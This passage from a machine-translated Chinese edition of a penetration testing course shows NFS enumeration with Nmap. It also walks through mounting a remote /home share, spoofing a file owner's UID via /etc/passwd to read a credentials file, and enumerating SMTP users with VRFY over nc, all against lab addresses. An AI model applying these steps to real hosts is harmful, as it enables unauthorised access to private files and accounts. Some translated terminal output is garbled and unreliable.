<div style="position:absolute;top:234853;left:276"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 256 - 查询 rpcbind 以获得注册的服务</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:234884;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.4.2 Nmap NFS NSE 脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:234922;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦我们发现 NFS 正在运行，我们就可以收集额外的信息，枚举 NFS 服务，以及</font></font></nobr></div>
<div style="position:absolute;top:234942;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 /usr/share/nmap/scripts 目录中的 NSE 脚本发现其他服务：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:234977;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -1 /usr/share/nmap/scripts/nfs*</font></font></font></b></nobr></div>
<div style="position:absolute;top:234994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/nmap/scripts/nfs-ls.nse</font></font></nobr></div>
<div style="position:absolute;top:235011;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/nmap/scripts/nfs-showmount.nse</font></font></nobr></div>
<div style="position:absolute;top:235027;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/usr/share/nmap/scripts/nfs-statfs.nse</font></font></nobr></div>
<div style="position:absolute;top:235047;left:316"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 257 - 为 NFS 定位各种 NSE 脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:235077;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用脚本名称中的通配符 (*) 运行所有这三个脚本：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:235111;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap -p 111 --script nfs* 10.11.1.72</font></font></font></b></nobr></div>
<div style="position:absolute;top:235128;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:235145;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.72 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:235179;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务</font></font></nobr></div>
<div style="position:absolute;top:235196;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">111/tcp 打开 rpcbind</font></font></nobr></div>
<div style="position:absolute;top:235213;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">nfs-showmount：</font></font></nobr></div>
<div style="position:absolute;top:235230;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_ /home 10.11.0.0/255.255.0.0</font></font></nobr></div>
<div style="position:absolute;top:235249;left:332"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 258 - 为 NFS 运行所有 NSE 脚本 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:235399;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="199"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 199 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:235432;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:236509;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:236509;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:236509;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">199</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:235528;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在这种情况下，整个 /home 目录被共享，我们可以通过将它挂载到我们的</font></font></nobr></div>
<div style="position:absolute;top:235547;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali 虚拟机。</font><font style="vertical-align: inherit;">我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mount</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来执行此操作，并使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-o nolock</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">禁用文件锁定，</font></font></nobr></div>
<div style="position:absolute;top:235567;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">较旧的 NFS 服务器通常需要：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:235601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mkdir home</font></font></font></b></nobr></div>
<div style="position:absolute;top:235635;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo mount -o nolock 10.11.1.72:/home ~/home/</font></font></font></b></nobr></div>
<div style="position:absolute;top:235669;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd home/ &amp;&amp; ls</font></font></font></b></nobr></div>
<div style="position:absolute;top:235686;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">jenny joe45 john marcus ryuu</font></font></nobr></div>
<div style="position:absolute;top:235705;left:295"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 259 - 在 Kali 中使用 mount 访问 NFS 共享</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:235735;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据这个文件列表，我们可以看到有几个本地用户的主目录在</font></font></nobr></div>
<div style="position:absolute;top:235754;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">远程机器。</font><font style="vertical-align: inherit;">深入挖掘，我们找到了一个引起我们注意的文件名，因此我们尝试</font></font></nobr></div>
<div style="position:absolute;top:235774;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查看它：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:235808;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/home$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd marcus</font></font></font></b></nobr></div>
<div style="position:absolute;top:235843;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/home/marcus$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -la</font></font></font></b></nobr></div>
<div style="position:absolute;top:235859;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">共 24 个</font></font></nobr></div>
<div style="position:absolute;top:235876;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">drwxr-xr-x 2 1014 1014 4096 六月 10 09:16。</font></font></nobr></div>
<div style="position:absolute;top:235893;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">drwxr-xr-x 7 根 4096 2015 年 9 月 17 日 ..</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:235910;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-rwx------ 1 1014 1014 48 Jun 10 09:16 creds.txt</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:235944;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/home/marcus$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat creds.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:235961;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">猫：creds.txt：权限被拒绝</font></font></nobr></div>
<div style="position:absolute;top:235980;left:278"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 260 - 使用内置命令探索 NFS 共享</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:236010;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们似乎无权查看此文件。</font><font style="vertical-align: inherit;">仔细查看文件权限，</font></font></nobr></div>
<div style="position:absolute;top:236029;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以看到它的所有者的 UUID 为 1014，并且还</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">读取 (r)</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">、</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">写入 (w)</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行 (x)</font></font></i></nobr></div>
<div style="position:absolute;top:236049;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">权限。</font><font style="vertical-align: inherit;">我们可以用这些信息做什么？</font><font style="vertical-align: inherit;">由于我们可以完全访问我们的</font></font></nobr></div>
<div style="position:absolute;top:236068;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali机器，我们可以尝试使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">adduser</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">给它添加一个本地用户</font><font style="vertical-align: inherit;">，把它的UUID改成</font></font></nobr></div>
<div style="position:absolute;top:236088;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1014, </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">su</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到该用户，然后再次尝试访问该文件：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:236122;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/home/stefan$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo adduser pwn</font></font></font></b></nobr></div>
<div style="position:absolute;top:236139;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加用户“pwn”...</font></font></nobr></div>
<div style="position:absolute;top:236156;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加新组“pwn”（1001）...</font></font></nobr></div>
<div style="position:absolute;top:236173;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用组“pwn”添加新用户“pwn”（1001）...</font></font></nobr></div>
<div style="position:absolute;top:236190;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正在创建主目录 `/home/pwn' ...</font></font></nobr></div>
<div style="position:absolute;top:236207;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">从`/etc/skel' 复制文件...</font></font></nobr></div>
<div style="position:absolute;top:236224;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输入新的 UNIX 密码： </font></font></nobr></div>
<div style="position:absolute;top:236241;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">重新输入新的 UNIX 密码： </font></font></nobr></div>
<div style="position:absolute;top:236258;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">passwd：密码更新成功</font></font></nobr></div>
<div style="position:absolute;top:236275;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更改 pwn 的用户信息</font></font></nobr></div>
<div style="position:absolute;top:236292;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输入新值，或按 ENTER 获取默认值</font></font></nobr></div>
<div style="position:absolute;top:236309;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">全名 []： </font></font></nobr></div>
<div style="position:absolute;top:236326;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">房间号 []： </font></font></nobr></div>
<div style="position:absolute;top:236343;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">工作电话 []： </font></font></nobr></div>
<div style="position:absolute;top:236360;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">家庭电话 []： </font></font></nobr></div>
<div style="position:absolute;top:236377;left:141"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">其他 []： </font></font></nobr></div>
<div style="position:absolute;top:236394;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息是否正确？</font><font style="vertical-align: inherit;">[是/否]</font></font></nobr></div>
<div style="position:absolute;top:236413;left:310"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 261 - 将本地用户添加到我们的 Kali 机器 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:236587;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="200"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 200 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:236620;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:237697;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:237697;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:237697;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">200</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:236716;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据上面的输出，我们可以看到新用户的 UUID 为 1001，这不是真的</font></font></nobr></div>
<div style="position:absolute;top:236735;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们需要的。</font><font style="vertical-align: inherit;">我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sed</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将其更改为 1014</font><font style="vertical-align: inherit;">并确认发生了更改。</font><font style="vertical-align: inherit;">该</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-i</font></font></font></b></nobr></div>
<div style="position:absolute;top:236755;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项用于就地替换文件，</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-e</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项执行脚本。</font><font style="vertical-align: inherit;">在这种情况下，那</font></font></nobr></div>
<div style="position:absolute;top:236774;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">恰好是</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">'s/1001/1014/g'</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，它将全局替换 /etc/passwd 文件中的 UUID：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:236809;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/home/marcus$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo sed -i -e 's/1001/1014/g' /etc/passwd</font></font></font></b></nobr></div>
<div style="position:absolute;top:236843;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/home/marcus$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat /etc/passwd | </font><font style="vertical-align: inherit;">登录</font></font></font></b></nobr></div>
<div style="position:absolute;top:236860;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pwn:x: </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1014:1014</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> :,,,:/home/pwn:/bin/bash</font></font></nobr></div>
<div style="position:absolute;top:236879;left:303"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 262 - 更新 /etc/passwd 文件中的 UUID</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:236908;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到现在为止还挺好。</font><font style="vertical-align: inherit;">我们尝试</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">su</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到新添加的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pwn</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户，验证我们的UUID确实改变了，</font></font></nobr></div>
<div style="position:absolute;top:236928;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然后再次尝试访问该文件。</font><font style="vertical-align: inherit;">我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">su</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令更改当前登录</font></font></nobr></div>
<div style="position:absolute;top:236947;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话的所有者。</font><font style="vertical-align: inherit;">然后，我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">id</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来显示我们当前的用户 ID。</font><font style="vertical-align: inherit;">最后，我们将尝试访问</font></font></nobr></div>
<div style="position:absolute;top:236967;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再次文件：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:237001;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~/home/marcus$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">su pwn</font></font></font></b></nobr></div>
<div style="position:absolute;top:237036;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pwn@kali:/root/home/marcus$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">id</font></font></font></b></nobr></div>
<div style="position:absolute;top:237052;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">uid=1014(pwn) gid=1014 组=1014</font></font></nobr></div>
<div style="position:absolute;top:237086;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">pwn@kali:/root/home/marcus$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat creds.txt</font></font></font></b></nobr></div>
<div style="position:absolute;top:237103;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不是你想要的，努力吧！！！</font><font style="vertical-align: inherit;">:O)</font></font></nobr></div>
<div style="position:absolute;top:237123;left:325"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 263 - 以 pwn 用户身份访问文件</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:237152;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">优秀的！</font><font style="vertical-align: inherit;">我们现在可以读取文件并根据需要对其进行更改。</font><font style="vertical-align: inherit;">虽然文件内容</font></font></nobr></div>
<div style="position:absolute;top:237172;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">不是我们在这个特定实例中所期望的，具有这种安全级别的系统是</font></font></nobr></div>
<div style="position:absolute;top:237191;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以在纯文本文件中存储敏感信息而臭名昭著。</font><font style="vertical-align: inherit;">花点时间想想什么</font></font></nobr></div>
<div style="position:absolute;top:237210;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">否则我们在这种情况下可能能够做到，从替换 SSH 密钥到读取</font></font></nobr></div>
<div style="position:absolute;top:237230;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">机密文件等。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:237264;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.4.2.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:237294;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用 Nmap 列出实验室中运行 NFS 的机器。</font></font></nobr></div>
<div style="position:absolute;top:237322;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 使用 NSE 脚本扫描这些系统并收集有关可访问的其他信息</font></font></nobr></div>
<div style="position:absolute;top:237342;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">分享。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:237379;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">7.5 SMTP 枚举</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:237420;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还可以从易受攻击的邮件服务器收集有关主机或网络的信息。</font><font style="vertical-align: inherit;">简单的</font></font></nobr></div>
<div style="position:absolute;top:237440;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">邮件传输协议 (SMTP) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">216</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">支持几个有趣的命令，例如</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VRFY</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font></nobr></div>
<div style="position:absolute;top:237459;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">经验值</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">一个</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VRFY</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请求要求服务器验证的电子邮件地址，而</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EXPN</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请求服务器</font></font></nobr></div>
<div style="position:absolute;top:237479;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">邮件列表的成员资格。</font><font style="vertical-align: inherit;">这些通常可以被滥用来验证邮件中的现有用户</font></font></nobr></div>
<div style="position:absolute;top:237498;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务器，这是渗透测试期间的有用信息。</font><font style="vertical-align: inherit;">考虑这个例子：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:237533;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nc -nv 10.11.1.217 25</font></font></font></b></nobr></div>
<div style="position:absolute;top:237550;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(未知) [10.11.1.217] 25 (smtp) 打开</font></font></nobr></div>
<div style="position:absolute;top:237567;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">220 hotline.localdomain ESMTP Postfix</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:237584;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VRFY 根</font></font></b></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:237647;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">216 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:237775;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="201"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第201页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:237808;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:238885;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:238885;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:238885;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">201</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:237904;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">252 2.0.0 根</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:237920;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">VRFY 不存在</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:237937;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">550 5.1.1 &lt;idontexist&gt;：收件人地址被拒绝：本地收件人中的用户未知</font></font></nobr></div>
<div style="position:absolute;top:237954;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">布莱尔</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:11px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:237972;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">^C</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:237991;left:329"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 264 - 使用 nc 验证 SMTP 用户</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:238020;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意成功和错误消息的不同之处。</font><font style="vertical-align: inherit;">SMTP 服务器高兴地验证用户</font></font></nobr></div>
<div style="position:absolute;top:238040;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">存在。</font><font style="vertical-align: inherit;">此过程可用于帮助以自动方式猜测有效的用户名。</font></font></nobr></div>
